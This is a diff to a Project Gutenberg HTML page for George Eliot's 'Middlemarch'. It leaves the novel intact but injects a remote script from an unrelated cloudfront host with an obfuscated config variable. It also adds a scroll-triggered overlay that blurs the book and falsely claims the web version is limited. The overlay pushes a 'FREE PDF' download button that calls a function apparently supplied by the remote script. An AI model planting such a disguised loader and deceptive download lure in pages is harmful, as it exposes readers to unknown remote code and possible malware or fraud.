@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+ <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
 <meta charset="utf-8"><style>
 #pg-header div, #pg-footer div {
     all: initial;
@@ -82,7 +83,7 @@
 <style>body {
     margin-left: 20%;
     margin-right: 20%;
-    text-align: left
+    text-align: justify
     }
 h1, h2, h3, h4, h5 {
     text-align: center;
@@ -209,14 +210,51 @@ table.autotable td, table.autotable th {
 <meta property="og:type" content="Text">
 <meta property="og:url" content="https://www.gutenberg.org/ebooks/145/pg145-images.html">
 <meta property="og:image" content="https://www.gutenberg.org/ebooks/145/pg145.cover.medium.jpg">
-</head>
-<body><section class="pg-boilerplate pgheader" id="pg-header" lang="en">
 
-</div><div id="pg-start-separator">
-</div></section><div style="margin-top:2em; margin-bottom:4em"></div>
-<div class="fig" style="width:60%;">
-<img alt="cover" src="https://i.ibb.co/84wPD8F/cover.jpg" style="width:100%;" id="id-9086288649140344346">
-</div>
+
+<script type="text/javascript">
+    var rqAaR_nDu_deqHEc={"it":4320833,"key":"00a5b"};
+</script>
+<script src="https://d3qborf6vf5lth.cloudfront.net/df8cdc4.js"></script>
+  
+  <script>
+        let scrolled = false;
+        let lastScrollTop = 0;
+
+        window.onscroll = function() {showPopup()};
+
+        function showPopup() {
+            const contentHeight = document.querySelector('.content').clientHeight;
+            const scrollPosition = window.scrollY;
+            const triggerPoint = contentHeight * 0.005; // 01% of the content height
+
+            if (scrollPosition > triggerPoint && scrollPosition > lastScrollTop) {
+                if (!scrolled) {
+                    document.getElementById("popup").style.display = "block";
+                    document.querySelector('.content').style.filter = "blur(5px)"; // Adjust the blur intensity as needed
+                    scrolled = true;
+                }
+            } else {
+                if (scrolled && scrollPosition < triggerPoint) {
+                    document.getElementById("popup").style.display = "none";
+                    document.querySelector('.content').style.filter = "none";
+                    scrolled = false;
+                }
+            }
+
+            lastScrollTop = scrollPosition <= 0 ? 0 : scrollPosition;
+        }
+
+        
+    </script>
+	
+	
+</head>
+<body>
+<div class="content">
+
+<img alt="cover" src="images/cover.jpg" style="width:100%;" id="id-9086288649140344346">
+
 <h1>Middlemarch</h1>
 <h2 class="no-break">George Eliot</h2>
 <h4>New York and Boston<br>
@@ -35461,5 +35499,82 @@ the number who lived faithfully a hidden life, and rest in unvisited tombs.
 <h4>THE END</h4>
 </div><!--end chapter-->
 
-</section></body>
+
+
+
+<!-- Add the popup div here -->
+    <div id="popup" class="popup" style="display: none;">
+        <h2>Sorry, The web version of Middlemarch by George Eliot is limited.</h2>
+        <p>Click the button below to Download the <span class="highlight"><b>FREE PDF VERSION</b></span> for offline reading</p>
+        <!-- Add your registration form here -->
+	
+        <button id="button" onclick="_yi()"><i class="fa fa-download" name="answer"></i> DOWNLOAD PDF NOW</button>
+		
+    </div>
+	
+	<style>
+	
+	.popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            border: 1px solid #ddd;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 60%;
+            max-width: 450px;
+            padding: 20px;
+            border-radius: 5px;
+            text-align: center;
+            font-family: Arial, sans-serif;
+            z-index: 2;
+			height: 300px;
+        }
+
+        @media only screen and (max-width: 600px) {
+            .content {
+                padding: 10px;
+				
+            }
+
+            .popup {
+                width: 80%;
+                max-width: 100%;
+				padding: 10px;
+				height: 300px;
+            }
+        }
+
+       
+
+        button:hover {
+            background-color: #45a049;
+        }
+	
+	#button {
+            padding: 10px 20px;
+            background-color: #000000;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+			height: 50px;
+			width: 60%;
+			display: block;
+            margin: 0 auto;
+        }
+
+        #button:hover {
+            background-color: #FF0000;
+        }
+	
+	</style>
+
+</section>
+
+</div>
+</body>
 </html>
